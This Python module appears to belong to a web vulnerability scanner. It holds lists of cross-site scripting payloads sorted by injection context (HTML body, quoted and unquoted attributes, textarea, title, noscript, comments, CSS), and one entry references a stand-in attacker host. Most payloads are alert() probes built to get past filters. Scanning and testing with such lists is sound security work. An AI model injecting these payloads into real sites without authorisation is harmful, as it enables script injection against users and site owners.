# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""HTML body, attribute, and special-tag context payloads."""

HTML_BODY = [
    "<img src=x onerror=alert('{marker}')>",
    "<svg onload=alert('{marker}')>",
    "<details open ontoggle=alert('{marker}')>",
    "<iframe srcdoc=\"<script>alert('{marker}')</script>\">",
    "<body onload=alert('{marker}')>",
    "<input autofocus onfocus=alert('{marker}')>",
    "<video src=x onerror=alert('{marker}')>",
    "<math><mtext></math><img src=x onerror=alert('{marker}')>",
    "<table background=\"javascript:alert('{marker}')\">",
    "</p><script>alert('{marker}')</script>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert('{marker}')\">",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('{marker}')\">",
    "<div onmouseover=\"alert('{marker}')\">x</div>",
    "<body><img src=x onerror=alert('{marker}')></body>",
    "\n<img src=x onerror=alert('{marker}')>",
    "\n<script>alert('{marker}')</script>",
    "<svg><animate onbegin=alert('{marker}') attributeName=x dur=1s>",
    "<svg><animate onend=alert('{marker}') attributeName=x dur=1s>",
    "<svg><animate onrepeat=alert('{marker}') attributeName=x dur=1s repeatCount=2 />",
    "<style>@keyframes x{{}}</style><xss style=\"animation-name:x\" onanimationend=\"alert('{marker}')\"></xss>",
    "<style>@keyframes x{{}}</style><xss style=\"animation-name:x\" onanimationstart=\"alert('{marker}')\"></xss>",
    "<xss oncontentvisibilityautostatechange=alert('{marker}') style=display:block;content-visibility:auto>",
    "<input type=hidden oncontentvisibilityautostatechange=alert('{marker}') style=content-visibility:auto>",
    "<xss onfocus=alert('{marker}') autofocus tabindex=1>",
    "<body onpageshow=alert('{marker}')>",
    "<audio src/onerror=alert('{marker}')>",
    "<video onloadstart=\"alert('{marker}')\"><source></video>",
]

ATTR_DOUBLE = [
    '"><img src=x onerror=alert(\'{marker}\')>',
    '"><svg onload=alert(\'{marker}\')>',
    '" onmouseover="alert(\'{marker}\')" x="',
    '" onfocus="alert(\'{marker}\')" autofocus="',
    '"><details open ontoggle=alert(\'{marker}\')>',
    '"><script>alert(\'{marker}\')</script>',
    '" style="expression(alert(\'{marker}\'))" x="',
    '"><meta http-equiv="refresh" content="0;url=javascript:alert(\'{marker}\')">',
    '"><svg><animate onbegin=alert(\'{marker}\') attributeName=x dur=1s>',
    '"><style>@keyframes x{{}}</style><xss style="animation-name:x" onanimationend="alert(\'{marker}\')"></xss>',
    '" oncontentvisibilityautostatechange="alert(\'{marker}\')" style="content-visibility:auto"',
    '"><xss onfocus=alert(\'{marker}\') autofocus tabindex=1>',
]

ATTR_SINGLE = [
    "'><img src=x onerror=alert('{marker}')>",
    "' onmouseover='alert(\"{marker}\")' x='",
    "'><svg onload=alert('{marker}')>",
    "' onfocus='alert(\"{marker}\")' autofocus='",
    "' style='expression(alert(\"{marker}\"))' x='",
    "'><svg><animate onbegin=alert('{marker}') attributeName=x dur=1s>",
    "' oncontentvisibilityautostatechange='alert(\"{marker}\")' style='content-visibility:auto'",
    "'><xss onfocus=alert('{marker}') autofocus tabindex=1>",
]

ATTR_UNQUOTED = [
    " onmouseover=alert('{marker}') x=",
    " onfocus=alert('{marker}') autofocus ",
    "/><img src=x onerror=alert('{marker}')>",
    " style=expression(alert('{marker}')) ",
    "/><svg><animate onbegin=alert('{marker}') attributeName=x dur=1s>",
    " oncontentvisibilityautostatechange=alert('{marker}') style=content-visibility:auto ",
]

ATTR_NAME = [
    "onmouseover=alert('{marker}') x=",
    "onfocus=alert('{marker}') autofocus ",
    "onerror=alert('{marker}') src=x ",
    "onload=alert('{marker}') ",
]

TAG_NAME = [
    "img src=x onerror=alert('{marker}')",
    "svg onload=alert('{marker}')",
    "script>alert('{marker}')</script",
    "details open ontoggle=alert('{marker}')",
    "input autofocus onfocus=alert('{marker}')",
]

TEXTAREA = [
    "</textarea><img src=x onerror=alert('{marker}')>",
    "</textarea><svg onload=alert('{marker}')>",
    "</textarea><script>alert('{marker}')</script>",
    "</textarea><details open ontoggle=alert('{marker}')>",
]

TITLE = [
    "</title><img src=x onerror=alert('{marker}')>",
    "</title><svg onload=alert('{marker}')>",
    "</title><script>alert('{marker}')</script>",
    "</title><details open ontoggle=alert('{marker}')>",
]

NOSCRIPT = [
    "</noscript><img src=x onerror=alert('{marker}')>",
    "</noscript><svg onload=alert('{marker}')>",
    "</noscript><script>alert('{marker}')</script>",
    "</noscript><details open ontoggle=alert('{marker}')>",
]

IFRAME_SRCDOC = [
    '"><script>alert(\'{marker}\')</script>',
    '"><img src=x onerror=alert(\'{marker}\')>',
    '"><svg onload=alert(\'{marker}\')>',
    '<script>alert(\'{marker}\')</script>',
    '<img src=x onerror=alert(\'{marker}\')>',
]

OBJECT_DATA = [
    "javascript:alert('{marker}')",
    "//attacker.example/{marker}",
    "data:text/html,<script>alert('{marker}')</script>",
    '"><script>alert(\'{marker}\')</script>',
]

COMMENT = [
    "-->;<script>alert('{marker}')</script><!--",
    "--><img src=x onerror=alert('{marker}')><!--",
    "--><svg onload=alert('{marker}')><!--",
]

CSS = [
    "expression(alert('{marker}'))",
    "</style><script>alert('{marker}')</script>",
    "</style><img src=x onerror=alert('{marker}')>",
]

CSS_VALUE = [
    "}}</style><img src=x onerror=alert('{marker}')>",
    "}}expression(alert('{marker}'))",
    "}}</style><script>alert('{marker}')</script>",
    "expression(alert('{marker}'))",
    "}}</style><svg onload=alert('{marker}')>",
]
